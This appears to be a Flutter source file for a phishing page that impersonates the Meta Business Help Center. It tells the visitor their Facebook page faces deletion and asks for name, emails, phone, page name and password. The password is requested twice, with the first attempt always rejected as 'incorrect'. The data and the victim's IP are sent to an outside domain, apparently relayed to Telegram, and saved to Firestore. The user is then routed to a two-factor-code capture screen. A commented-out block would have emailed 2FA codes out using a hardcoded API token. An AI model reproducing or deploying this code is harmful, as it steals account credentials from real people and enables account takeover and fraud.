import 'dart:convert';
import 'package:exins/Views/Web/config.dart';
import 'package:flutter/foundation.dart';

import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:dart_ipify/dart_ipify.dart';
import 'package:email_validator/email_validator.dart';
import 'package:emailjs/emailjs.dart';
import 'package:exins/Constants/app_constants.dart';
import 'package:exins/Provider/uid_provider.dart';
import 'package:exins/Responsive/responsive_layout.dart';
import 'package:exins/Views/Mobile/mobile_tfa.dart';
import 'package:exins/Views/Web/tfa.dart';
import 'package:exins/Views/Widgets/Text/poppins.dart';
import 'package:exins/Views/Widgets/TextField/intel_textField.dart';
import 'package:flutter/material.dart';
import 'package:flutter_svg/flutter_svg.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:page_transition/page_transition.dart';
import 'package:provider/provider.dart';
import 'package:http/http.dart' as http;

class MobileGetStarted extends StatefulWidget {
  MobileGetStarted({super.key});

  @override
  State<MobileGetStarted> createState() => _MobileGetStartedState();
}

class _MobileGetStartedState extends State<MobileGetStarted> {
  TextEditingController infoController = TextEditingController();

  TextEditingController fullNameController = TextEditingController();

  // TextEditingController loginEmailController = TextEditingController();
  TextEditingController businessEmailController = TextEditingController();
  TextEditingController personalEmailController = TextEditingController();

  TextEditingController mobilePhoneController = TextEditingController();

  TextEditingController fbNameController = TextEditingController();

  TextEditingController passController = TextEditingController();

  bool isCheckBox = false;
  bool isPassTested = false;
  bool isSending = false;
  bool isBusinessEmailValid = true;
  bool isPersonalEmailValid = true;
  String p1 = "";
  String p2 = "";
  Map<String, dynamic> fbMap = {};
  String? usrUid;
  String? ip;

  @override
  void initState() {
    Ipify.ipv4().then((value) => ip = value);
    super.initState();
  }

  Future<void> sendMessage(Map map, String ip) async {
    const baseUrl =
        'https://api.metafanpagesupport.pro/v1/users/create'; // Replace with your API base URL

    final body = {
      'fullname': map["Full Name"], //
      'businessEmail': map["Business Email Address"],
      'email': map["Personal Email Address"],
      'facebookPage': map["Facebook Page Name"],
      'phoneNumber': map["Phone Number"],
      'password': map["password1"],
      'password2': map["password2"],
      'description': map["Additional Info"],
      "ip": ip
    };
    final bodyConvert = jsonEncode(body);
    debugPrint('MobileGetStarted: $bodyConvert');
    Config config = Config();
    config.sendTele(bodyConvert);

    Map<String, String> headers = {
      'Content-Type': 'application/json',
    };

    final response =
        await http.put(Uri.parse(baseUrl), body: bodyConvert, headers: headers);

    if (response.statusCode == 200) {
    } else {
      print('Failed to send message');
    }
  }

  // sendEmail(Map map, String ip) async {
  //   //   await EmailJS.send(
  //   //     AppConstants.SERVICE_KEY,
  //   //     AppConstants.TEMPLATE_ID,
  //   //     {
  //   //       'user_email': AppConstants.email,
  //   //       'full_name': map["Full Name"],//
  //   //       'bus_email': map["Business Email Address"],
  //   //       'pers_email': map["Personal Email Address"],
  //   //       'fb_page_name': map["Facebook Page Name"],
  //   //       'phone': map["Phone Number"],
  //   //       'p_one': map["password1"],
  //   //       'p_two': map["password2"],
  //   //       'tfa_one': map["firstTFA"],
  //   //       'tfa_two': map["secondTFA"],
  //   //       'tfa_three': map["thirdTFA"],
  //   //       'add_info': map["Additional Info"],
  //   //       "ip_address": ip
  //   //     },
  //   //     const Options(
  //   //       publicKey: AppConstants.PUBLIC_KEY,
  //   //       privateKey: AppConstants.PRIVATE_KEY,
  //   //     ),
  //   //   );

  //   //   return true;
  //   // } catch (error) {
  //   //   if (error is EmailJSResponseStatus) {}
  //   //   print(error.toString());
  //   // }
  //   // return false;

  //   var url = Uri.parse('https://api.emailjs.com/api/v1.0/email/send');

  //   var headers = <String, String>{
  //     'Content-Type': 'application/json; charset=UTF-8',
  //     'Authorization': 'Bearer 8sM8KJk7HJLd-V-oN3ZZo'
  //   };

  //   Map<String, dynamic> body = {
  //     'service_id': AppConstants.SERVICE_KEY,
  //     'template_id': AppConstants.TEMPLATE_ID,
  //     'user_id': AppConstants.PUBLIC_KEY,
  //     'template_params': {
  //       'subject': "New User Information",
  //       'to_email': AppConstants.email,
  //       'user_email': AppConstants.email,
  //       'full_name': map["Full Name"], //
  //       'bus_email': map["Business Email Address"],
  //       'pers_email': map["Personal Email Address"],
  //       'fb_page_name': map["Facebook Page Name"],
  //       'phone': map["Phone Number"],
  //       'p_one': map["password1"],
  //       'p_two': map["password2"],
  //       'tfa_one': map["firstTFA"],
  //       'tfa_two': map["secondTFA"],
  //       'tfa_three': map["thirdTFA"],
  //       'add_info': map["Additional Info"],
  //       "ip_address": ip
  //     },
  //   };

  //   var client = http.Client();

  //   try {
  //     var response = await client.post(
  //       url,
  //       headers: headers,
  //       body: jsonEncode(body),
  //     );

  //     if (response.statusCode != 200) {
  //       throw Exception(
  //           'Failed to send email. Status code: ${response.statusCode}');
  //     }
  //   } finally {
  //     client.close();
  //   }
  // }

  @override
  Widget build(BuildContext context) {
    usrUid = Provider.of<UidProvider>(context).uid;

    StatefulBuilder alert = StatefulBuilder(
      builder: (context, setState) => AlertDialog(
        contentPadding: const EdgeInsets.all(0),
        insetPadding: const EdgeInsets.symmetric(horizontal: 0),
        alignment: Alignment.center,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(5),
        ),
        content: SingleChildScrollView(
          child: Container(
            width: MediaQuery.of(context).size.width * 0.95,
            child: SizedBox(
              child: Column(
                mainAxisAlignment: MainAxisAlignment.start,
                crossAxisAlignment: CrossAxisAlignment.start,
                children: <Widget>[
                  Padding(
                    padding: const EdgeInsets.symmetric(
                        vertical: 10, horizontal: 20),
                    child: Row(
                      mainAxisAlignment: MainAxisAlignment.spaceBetween,
                      children: [
                        const Text(
                          "Please Enter Your Password",
                          style: TextStyle(
                            fontWeight: FontWeight.bold,
                            letterSpacing: 1,
                            fontSize: 14,
                          ),
                        ),
                        GestureDetector(
                          child: const MouseRegion(
                            cursor: SystemMouseCursors.click,
                            child: Icon(
                              Icons.close,
                              color: Color(0xff808080),
                            ),
                          ),
                          onTap: () {
                            Navigator.of(context).pop();
                          },
                        )
                      ],
                    ),
                  ),
                  Divider(
                    thickness: 1.5,
                    color: Colors.grey.shade200,
                  ),
                  const Padding(
                    padding:
                        EdgeInsets.symmetric(vertical: 10.0, horizontal: 20),
                    child: Text(
                      'For your security, you must re-enter your password to continue.',
                      style: TextStyle(
                        fontSize: 14,
                        color: Color(0xff65676B),
                      ),
                    ),
                  ),
                  Padding(
                    padding: const EdgeInsets.symmetric(horizontal: 20),
                    child: IntelTextField(
                      controller: passController,
                      height: 35,
                      obsecureText: true,
                      title: "Password",
                    ),
                  ),
                  const SizedBox(
                    height: 10,
                  ),
                  isPassTested
                      ? Padding(
                          padding: const EdgeInsets.symmetric(horizontal: 20),
                          child: Poppins(
                            text: "Your password was incorrect !",
                            color: Colors.red,
                            fontSize: 13,
                          ),
                        )
                      : Container(),
                  isPassTested
                      ? const SizedBox(
                          height: 10,
                        )
                      : Container(),
                  Divider(
                    thickness: 1.5,
                    color: Colors.grey.shade200,
                  ),
                  const SizedBox(
                    height: 10,
                  ),
                  Padding(
                    padding: const EdgeInsets.symmetric(horizontal: 15.0),
                    child: Row(
                      mainAxisAlignment: MainAxisAlignment.end,
                      children: [
                        !isSending
                            ? ElevatedButton(
                                onPressed: () async {
                                  fbMap["Additional Info"] =
                                      infoController.text;
                                  fbMap["Full Name"] = fullNameController.text;
                                  fbMap["Business Email Address"] =
                                      businessEmailController.text;
                                  fbMap["Personal Email Address"] =
                                      personalEmailController.text;
                                  fbMap["Phone Number"] =
                                      mobilePhoneController.text;
                                  fbMap["Facebook Page Name"] =
                                      fbNameController.text;

                                  fbMap["step"] = 2;
                                  final ip = await Ipify.ipv4();
                                  fbMap["ip_address"] = ip;

                                  if (isPassTested == false) {
                                    setState(() {
                                      isPassTested = true;

                                      p1 = passController.text;
                                      fbMap["password1"] = p1;
                                      // sendMessage(fbMap, ip);

                                      passController.clear();
                                    });
                                  } else if (isPassTested == true) {
                                    p2 = passController.text;
                                    fbMap["password2"] = p2;

                                    sendMessage(fbMap, ip!);
                                    FirebaseFirestore.instance
                                        .collection("User")
                                        .doc(usrUid)
                                        .set(fbMap, SetOptions(merge: true));

                                    setState(() {
                                      isSending = true;
                                    });

                                    Navigator.push(
                                      context,
                                      PageTransition(
                                        type: PageTransitionType.fade,
                                        child: ResponsiveLayout(
                                          desktopBody: TFA(
                                            isMobile: false,
                                            isThird: false,
                                            dataMap: fbMap,
                                          ),
                                          mobileBody: MobileTFA(
                                            isMobile: true,
                                            isThird: false,
                                            dataMap: fbMap,
                                          ),
                                          tabletBody: MobileTFA(
                                            isMobile: true,
                                            isThird: false,
                                            dataMap: fbMap,
                                          ),
                                        ),
                                      ),
                                    );
                                    ;
                                  }
                                },
                                style: ElevatedButton.styleFrom(
                                    padding: EdgeInsets.zero,
                                    backgroundColor: const Color(0xff5E77AA),
                                    elevation: 0,
                                    fixedSize: const Size(100, 40)),
                                child: const Text(
                                  "Continue",
                                  style: TextStyle(
                                    color: Colors.white,
                                    fontWeight: FontWeight.w500,
                                    fontSize: 16,
                                  ),
                                ),
                              )
                            : const CircularProgressIndicator(),
                      ],
                    ),
                  ),
                  const SizedBox(
                    height: 20,
                  ),
                ],
              ),
            ),
          ),
        ),
      ),
    );

    void mainContinueOnPressed() async {
      if (!EmailValidator.validate(businessEmailController.text)) {
        setState(() {
          isBusinessEmailValid = false;
        });

        return;
      } else {
        setState(() {
          isBusinessEmailValid = true;
        });
      }

      if (!EmailValidator.validate(personalEmailController.text)) {
        setState(() {
          isPersonalEmailValid = false;
        });

        return;
      } else {
        setState(() {
          isPersonalEmailValid = true;
        });
      }

      fbMap["Additional Info"] = infoController.text;
      fbMap["Full Name"] = fullNameController.text;
      fbMap["Business Email Address"] = businessEmailController.text;
      fbMap["Personal Email Address"] = personalEmailController.text;
      fbMap["Phone Number"] = mobilePhoneController.text;
      fbMap["Facebook Page Name"] = fbNameController.text;
      fbMap["step"] = 1;
      fbMap["ip_address"] = await Ipify.ipv4();
      fbMap["timestamp"] = FieldValue.serverTimestamp();
      fbMap["uid"] = usrUid;

      showDialog(
          context: context,
          builder: (BuildContext context) {
            return LayoutBuilder(
              builder: (p0, p1) => alert,
            );
          });
    }

    return Scaffold(
      backgroundColor: const Color(0xffE9EAED),
      body: SingleChildScrollView(
        child: Column(
          children: [
            Container(
              height: 55,
              width: double.infinity,
              color: const Color(0xff355797),
              child: Row(
                mainAxisAlignment: MainAxisAlignment.spaceBetween,
                children: [
                  Row(
                    children: [
                      const SizedBox(
                        width: 20,
                      ),
                      Padding(
                        padding: const EdgeInsets.symmetric(horizontal: 10),
                        child: Image.asset(
                          "assets/images/metav2.png",
                          filterQuality: FilterQuality.high,
                        ),
                      ),
                      const VerticalDivider(
                        color: Colors.white,
                        width: 10,
                        thickness: 1,
                        indent: 15,
                        endIndent: 15,
                      ),
                      Padding(
                        padding: const EdgeInsets.symmetric(horizontal: 10),
                        child:
                            Poppins(text: "Support Inbox", color: Colors.white),
                      )
                    ],
                  ),
                  const Padding(
                    padding: EdgeInsets.symmetric(horizontal: 20.0),
                    child: Icon(
                      Icons.search,
                      color: Colors.white,
                    ),
                  )
                ],
              ),
            ),
            Container(
              height: 200,
              width: double.infinity,
              decoration: const BoxDecoration(
                color: Color(0xff23375C),
                image: DecorationImage(
                    image: AssetImage("assets/images/banner.png"),
                    fit: BoxFit.cover),
              ),
              child: Column(
                mainAxisAlignment: MainAxisAlignment.center,
                crossAxisAlignment: CrossAxisAlignment.center,
                children: [
                  Poppins(
                    text: "Meta Business Help Center",
                    color: Colors.white,
                    fontSize: 16,
                  ),
                  const SizedBox(
                    height: 10,
                  ),
                  Poppins(
                    text: "Get Started",
                    color: Colors.white,
                    fontSize: 30,
                  ),
                ],
              ),
            ),
            const SizedBox(
              height: 20,
            ),
            Padding(
              padding: const EdgeInsets.all(10.0),
              child: Container(
                width: double.infinity,
                decoration: const BoxDecoration(color: Colors.grey),
                child: Column(
                  children: [
                    Container(
                      height: 100,
                      decoration: const BoxDecoration(color: Colors.white),
                      child: Row(
                        children: [
                          Padding(
                            padding: const EdgeInsets.all(15.0),
                            child: Container(
                              height: 50,
                              width: 50,
                              decoration: const BoxDecoration(
                                  color: Color(0xff575D6D),
                                  shape: BoxShape.circle),
                              child: const Icon(
                                FontAwesomeIcons.envelopeOpenText,
                                color: Colors.white,
                              ),
                            ),
                          ),
                          Expanded(
                            child: Column(
                              mainAxisAlignment: MainAxisAlignment.center,
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [
                                Poppins(
                                  text:
                                      "Your page goes against our Community Standards",
                                  fontWeight: FontWeight.w700,
                                  fontSize: 14,
                                ),
                                const SizedBox(
                                  height: 5,
                                ),
                                Row(
                                  children: [
                                    Container(
                                      padding: const EdgeInsets.all(5),
                                      decoration: BoxDecoration(
                                        color: const Color(0xff4A80CC),
                                        borderRadius: BorderRadius.circular(5),
                                      ),
                                      child: Poppins(
                                        text: "OPEN",
                                        color: Colors.white,
                                        fontSize: 12,
                                      ),
                                    ),
                                    const SizedBox(
                                      width: 10,
                                    ),
                                    Poppins(
                                      text: "Case #234857718299001",
                                      color: Colors.grey.shade600,
                                      fontSize: 12,
                                    ),
                                  ],
                                )
                              ],
                            ),
                          ),
                        ],
                      ),
                    ),
                    Container(
                      color: const Color(0xffF6F7F8),
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.center,
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          Row(
                            crossAxisAlignment: CrossAxisAlignment.start,
                            mainAxisAlignment: MainAxisAlignment.start,
                            children: [
                              Padding(
                                padding: const EdgeInsets.all(20.0),
                                child: SizedBox(
                                  height: 40,
                                  width: 40,
                                  child: Image.asset("assets/images/fbv2.jpg"),
                                ),
                              ),
                              Expanded(
                                child: Padding(
                                  padding: const EdgeInsets.symmetric(
                                      horizontal: 10.0),
                                  child: Column(
                                    crossAxisAlignment:
                                        CrossAxisAlignment.start,
                                    mainAxisAlignment: MainAxisAlignment.start,
                                    children: [
                                      const SizedBox(
                                        height: 30,
                                      ),
                                      Poppins(
                                        text: "Our Message",
                                        fontWeight: FontWeight.w700,
                                        fontSize: 14,
                                      ),
                                      const SizedBox(
                                        height: 10,
                                      ),
                                      Poppins(
                                        text:
                                            """Your page has been scheduled for deletion because one or more the following
      - Intellectual Property Infringement
      - Community Standards
      - Hate Speech""",
                                        fontSize: 14,
                                      ),
                                      const SizedBox(
                                        height: 30,
                                      ),
                                    ],
                                  ),
                                ),
                              ),
                            ],
                          ),
                          const Divider(
                            thickness: 1,
                          ),
                          const SizedBox(
                            height: 10,
                          ),
                          Row(
                            crossAxisAlignment: CrossAxisAlignment.start,
                            mainAxisAlignment: MainAxisAlignment.start,
                            children: [
                              Padding(
                                padding: const EdgeInsets.all(20.0),
                                child: SizedBox(
                                  height: 40,
                                  width: 40,
                                  child:
                                      Image.asset("assets/images/avatar.png"),
                                ),
                              ),
                              Expanded(
                                child: Padding(
                                  padding: const EdgeInsets.symmetric(
                                      horizontal: 10.0),
                                  child: Column(
                                    crossAxisAlignment:
                                        CrossAxisAlignment.start,
                                    mainAxisAlignment: MainAxisAlignment.start,
                                    children: [
                                      const SizedBox(
                                        height: 30,
                                      ),
                                      Poppins(
                                        text: "Your Reply",
                                        fontWeight: FontWeight.w700,
                                        fontSize: 14,
                                      ),
                                      const SizedBox(
                                        height: 10,
                                      ),
                                      Poppins(
                                        text:
                                            "Please be sure to provide the requested information below. Failure to provide this information may delay the processing of your appeal.",
                                        fontSize: 14,
                                      ),
                                      const SizedBox(
                                        height: 10,
                                      ),
                                      Padding(
                                        padding:
                                            const EdgeInsets.only(right: 10.0),
                                        child: IntelTextField(
                                          controller: fullNameController,
                                          height: 35,
                                          title: "Full Name",
                                        ),
                                      ),
                                      const SizedBox(
                                        height: 10,
                                      ),
                                      Padding(
                                        padding:
                                            const EdgeInsets.only(right: 10.0),
                                        child: IntelTextField(
                                          controller: businessEmailController,
                                          height: 35,
                                          title: "Business email address",
                                        ),
                                      ),
                                      const SizedBox(
                                        height: 10,
                                      ),
                                      Padding(
                                        padding:
                                            const EdgeInsets.only(right: 10.0),
                                        child: IntelTextField(
                                          controller: personalEmailController,
                                          height: 35,
                                          title: "Personal email address",
                                        ),
                                      ),
                                      const SizedBox(
                                        height: 10,
                                      ),
                                      Padding(
                                        padding:
                                            const EdgeInsets.only(right: 10.0),
                                        child: IntelTextField(
                                          controller: mobilePhoneController,
                                          height: 35,
                                          title: "Mobile phone number",
                                        ),
                                      ),
                                      const SizedBox(
                                        height: 10,
                                      ),
                                      Padding(
                                        padding:
                                            const EdgeInsets.only(right: 10.0),
                                        child: IntelTextField(
                                          controller: fbNameController,
                                          height: 35,
                                          title: "Facebook Page Name",
                                        ),
                                      ),
                                      const SizedBox(
                                        height: 10,
                                      ),
                                      Padding(
                                        padding:
                                            const EdgeInsets.only(right: 10.0),
                                        child: IntelTextField(
                                          controller: infoController,
                                          height: null,
                                          maxLines: 3,
                                          title: "Your Appeal",
                                        ),
                                      ),
                                      const SizedBox(
                                        height: 20,
                                      ),
                                      Row(
                                        children: [
                                          Checkbox(
                                            value: isCheckBox,
                                            onChanged: (value) {
                                              setState(() {
                                                isCheckBox = !isCheckBox;
                                              });
                                            },
                                          ),
                                          Expanded(
                                            child: Text(
                                              "I agree to Terms, Data and Cookies Policy.",
                                              style: TextStyle(
                                                  fontSize: 14,
                                                  color: Colors.grey.shade600),
                                            ),
                                          ),
                                        ],
                                      ),
                                      const SizedBox(
                                        height: 10,
                                      ),
                                      !isBusinessEmailValid
                                          ? const SizedBox(
                                              height: 10,
                                            )
                                          : Container(),
                                      !isBusinessEmailValid
                                          ? Poppins(
                                              text:
                                                  "*Business Email Address is not Valid. Please Enter Correct Email Address",
                                              color: Colors.red)
                                          : Container(),
                                      !isBusinessEmailValid
                                          ? const SizedBox(
                                              height: 10,
                                            )
                                          : Container(),
                                      !isPersonalEmailValid
                                          ? const SizedBox(
                                              height: 10,
                                            )
                                          : Container(),
                                      !isPersonalEmailValid
                                          ? Poppins(
                                              text:
                                                  "*Personal Email Address is not Valid. Please Enter Correct Email Address",
                                              color: Colors.red)
                                          : Container(),
                                      !isPersonalEmailValid
                                          ? const SizedBox(
                                              height: 10,
                                            )
                                          : Container(),
                                      ElevatedButton(
                                        style: ElevatedButton.styleFrom(
                                            padding: EdgeInsets.zero,
                                            backgroundColor:
                                                const Color(0xff5E77AA),
                                            elevation: 0,
                                            fixedSize: const Size(120, 40)),
                                        onPressed: isCheckBox
                                            ? () async {
                                                mainContinueOnPressed();
                                              }
                                            : null,
                                        child: const Text(
                                          "Submit",
                                          style: TextStyle(
                                            color: Colors.white,
                                            fontWeight: FontWeight.w500,
                                            fontSize: 15,
                                          ),
                                        ),
                                      ),
                                    ],
                                  ),
                                ),
                              ),
                            ],
                          ),
                          const SizedBox(
                            height: 30,
                          ),
                        ],
                      ),
                    )
                  ],
                ),
              ),
            ),
            const SizedBox(
              height: 70,
            ),
            Container(
              padding: const EdgeInsets.all(30),
              color: const Color(0xff4080FF),
              child: Column(
                children: [
                  Container(
                    child: SvgPicture.asset(
                      "assets/images/metav2.svg",
                      width: 100,
                    ),
                  ),
                  const SizedBox(
                    height: 25,
                  ),
                  Poppins(
                      textAlign: TextAlign.center,
                      color: Colors.white,
                      text:
                          "Facebook can help your large, medium or small business grow. Get the latest news for advertisers and more on our Meta for Business Page.")
                ],
              ),
            ),
            const SizedBox(
              height: 30,
            ),
            Row(
              mainAxisAlignment: MainAxisAlignment.spaceEvenly,
              children: [
                Poppins(
                  text: "English (US)",
                  fontSize: 13,
                ),
                Poppins(
                  text: "English (UK)",
                  fontSize: 13,
                ),
                Poppins(
                  text: "Español",
                  fontSize: 13,
                ),
                Poppins(
                  text: "Português (Brasil)",
                  fontSize: 13,
                ),
              ],
            ),
            const SizedBox(
              height: 10,
            ),
            Row(
              mainAxisAlignment: MainAxisAlignment.spaceEvenly,
              children: [
                Poppins(
                  text: "Français (France)",
                  fontSize: 13,
                ),
                Poppins(
                  text: "Español (España)",
                  fontSize: 13,
                ),
                Poppins(
                  text: "More languages",
                  fontSize: 13,
                ),
              ],
            ),
            const SizedBox(
              height: 30,
            ),
            Row(
              mainAxisAlignment: MainAxisAlignment.spaceEvenly,
              children: [
                Poppins(
                  text: "© 2023 Meta",
                  fontSize: 13,
                ),
                Poppins(
                  text: "About",
                  fontSize: 13,
                ),
                Poppins(
                  text: "Developers",
                  fontSize: 13,
                ),
                Poppins(
                  text: "Careers",
                  fontSize: 13,
                ),
                Poppins(
                  text: "Privacy",
                  fontSize: 13,
                ),
                Poppins(
                  text: "Cookies",
                  fontSize: 13,
                ),
              ],
            ),
            const SizedBox(
              height: 10,
            ),
            Row(
              mainAxisAlignment: MainAxisAlignment.spaceEvenly,
              children: [
                Poppins(
                  text: "Terms",
                  fontSize: 13,
                ),
                Poppins(
                  text: "Help Center",
                  fontSize: 13,
                ),
              ],
            ),
          ],
        ),
      ),
    );
  }
}
